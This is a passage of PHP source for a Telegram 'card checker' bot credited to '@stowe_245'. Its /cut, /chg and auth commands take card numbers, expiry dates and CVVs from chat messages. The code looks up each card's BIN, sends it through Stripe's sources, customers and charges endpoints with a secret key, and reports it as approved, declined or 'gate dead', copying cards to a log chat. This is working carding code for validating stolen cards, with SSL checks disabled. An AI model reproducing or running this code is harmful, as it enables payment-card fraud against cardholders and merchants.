          sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            sendLog ($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -»  APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe auth log v2 </b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
          return;
          }
          if(strpos($result3, '"id"' )) {
            sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
  sendLog ($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -»  APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe auth log v2 </b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            
            return;
            }
          if(strpos($result3, '"cvc_check": "fail"' )) {
          sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» YOUR CARD WAS DECLINED BY ISUSING BANK ❌</b>\n<b>Gateway -» Stripe auth v2.1 </b>%0<b>Respone 2 -» $msg3a </b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
          return;
          }
          if (strpos($result3, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          else {
            sendMessage($chatId, "<b>SERVER ERROR</b>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
            sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
            sendLog($chatId, "<b>BUG REPORTED /aut</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
            }
    }
  //==================[cut Command]==================//
  elseif (strpos($message, "/cut") === 0){
  $message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
          $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
          'Host: lookup.binlist.net',
          'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $fim = curl_exec($ch);
          $bank = GetStr($fim, '"bank":{"name":"', '"');
          $name = GetStr($fim, '"name":"', '"');
          $brand = GetStr($fim, '"brand":"', '"');
          $country = GetStr($fim, '"country":{"name":"', '"');
          $emoji = GetStr($fim, '"emoji":"', '"');
          $scheme = GetStr($fim, '"scheme":"', '"');
          $type = GetStr($fim, '"type":"', '"');
          if(strpos($fim, '"type":"credit"') !== false){
          $bin = 'Credit';
          }else{
          $bin = 'Debit';
          };
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $pk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
          $result1 = curl_exec($ch);
          $tok1 = Getstr($result1,'"id": "','"');
          $msg1 = Getstr($result1,'"message": "','"');
          $msg1a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result1, "card_error")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "card_declined")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe CCN auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "invalid_cvc")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "sources_required_type_param")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "testmode_charges_only")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'invalid_expiry_year'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_year </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'invalid_expiry_month'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_month </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'incorrect_number'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» INVALID CARD ❌</b>\n<b>Response -» Incorrect number </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
          $result2 = curl_exec($ch);
          $tok2 = Getstr($result2,'"id": "','"');
          $msg2 = Getstr($result2,'"message": "','"');
          $msg2a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result2, "card_error")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Respone 2 -» $msg2a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "card_declined")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Respone 2 -» $msg2a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "invalid_account")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» CALL ISUSSER  </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "invalid_cvc")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "sources_required_type_param")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$tok2.'/sources/'.$tok1.'');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $result3 = curl_exec($ch);
          $msg3 = Getstr($result3,'"message": "','"');
          $msg3a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result3, '"cvc_check": "pass"' )) {
          sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
          return;
          }
          if(strpos($result3, '"id"' )) {
            sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
            }
          if(strpos($result3, '"cvc_check": "fail"' )) {
          sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» YOUR CARD WAS DECLINED BY ISUSING BANK ❌</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>%0<b>Respone 2 -» $msg3a </b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
          return;
          }
          if (strpos($result3, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          } else {
            sendMessage($chatId, "<b>SERVER ERROR</b>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
            sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
            sendLog($chatId, "<b>BUG REPORTED /aut</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
            }
          }
        
  //==================[chg Command]==================//
  elseif (strpos($message, "/chg") === 0){
    $message = substr($message, 4);
    $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
    $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
                  $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'Host: lookup.binlist.net',
                  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                  $fim = curl_exec($ch);
                  $bank = GetStr($fim, '"bank":{"name":"', '"');
                  $name = GetStr($fim, '"name":"', '"');
                  $brand = GetStr($fim, '"brand":"', '"');
                  $country = GetStr($fim, '"country":{"name":"', '"');
                  $emoji = GetStr($fim, '"emoji":"', '"');
                  $scheme = GetStr($fim, '"scheme":"', '"');
                  $type = GetStr($fim, '"type":"', '"');
                  if(strpos($fim, '"type":"credit"') !== false){
                  $bin = 'Credit';
                  }else{
                  $bin = 'Debit';
                  };
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $pk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
                  $result1 = curl_exec($ch);
                  $tok1 = Getstr($result1,'"id": "','"');
                  $msg1 = Getstr($result1,'"message": "','"');
                  if(strpos($result1, "card_error")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "card_declined")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "rate_limit")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "invalid_cvc")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "sources_required_type_param")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "testmode_charges_only")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'invalid_expiry_year'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_year </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'invalid_expiry_month'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_month </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if ((strpos($result3, 'incorrect_number'))){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» INVALID CARD ❌</b>\n<b>Response -» Incorrect number </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
                  $result2 = curl_exec($ch);
                  $tok2 = Getstr($result2,'"id": "','"');
                  $msg2 = Getstr($result2,'"message": "','"');
                  if(strpos($result2, "card_error")){
                    sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "invalid_cvc")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
                  if (strpos($result1, "sources_required_type_param")){
                    sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe Charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    return;
                  }
    
                  $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
